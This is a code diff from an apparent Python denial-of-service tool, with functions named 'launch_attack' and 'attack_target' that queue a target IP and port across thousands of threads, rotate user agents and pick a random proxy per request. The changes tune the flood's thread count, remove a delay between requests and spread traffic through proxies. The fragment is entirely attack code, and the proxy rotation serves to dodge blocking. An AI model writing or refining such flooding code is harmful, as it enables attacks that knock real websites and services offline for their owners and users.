@@ -47,22 +47,18 @@ def worker(queue):
         target_ip, target_port, user_agent, proxy = queue.get()
         attack_target(target_ip, target_port, user_agent, proxy)
         queue.task_done()
-        sleep(random.uniform(0.001, 0.01))  # Reduced sleep to increase request rate
 
 def launch_attack(target_ip, target_port):
     logging.info("Launching attack...")
 
     proxies = read_proxies('proxy.txt')
     user_agent = random.choice(user_agents)
-    thread_count = 100000  # Further increased thread count for high traffic
+    thread_count = 2000  # Increased thread count for high traffic
     
     queue = Queue()
 
-    for _ in range(thread_count // 2):
-        queue.put((target_ip, target_port, user_agent, None))
-
-    for proxy in proxies:
-        queue.put((target_ip, target_port, user_agent, proxy))
+    for _ in range(thread_count):
+        queue.put((target_ip, target_port, user_agent, random.choice(proxies)))
 
     for _ in range(thread_count):
         thread = threading.Thread(target=worker, args=(queue,))
